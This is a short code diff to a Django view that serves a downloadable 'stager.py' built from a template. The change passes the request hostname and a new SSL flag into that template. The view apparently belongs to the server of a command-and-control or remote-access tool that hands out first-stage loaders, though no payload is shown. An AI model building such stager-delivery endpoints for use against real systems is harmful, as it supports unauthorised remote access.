@@ -10,7 +10,11 @@ from django.http import HttpResponse
 
 def StagerView(request):
     hostname = request.META['HTTP_HOST']
-    response = render_to_response('template.py', context={'hostname' : hostname})
+    if request.is_secure():
+        ssl = True
+    else:
+        ssl = False
+    response = render_to_response('template.py', context={'hostname' : hostname, 'ssl': ssl})
     response['Content-Disposition'] = 'attatchment; filename=stager.py'
     return response
 
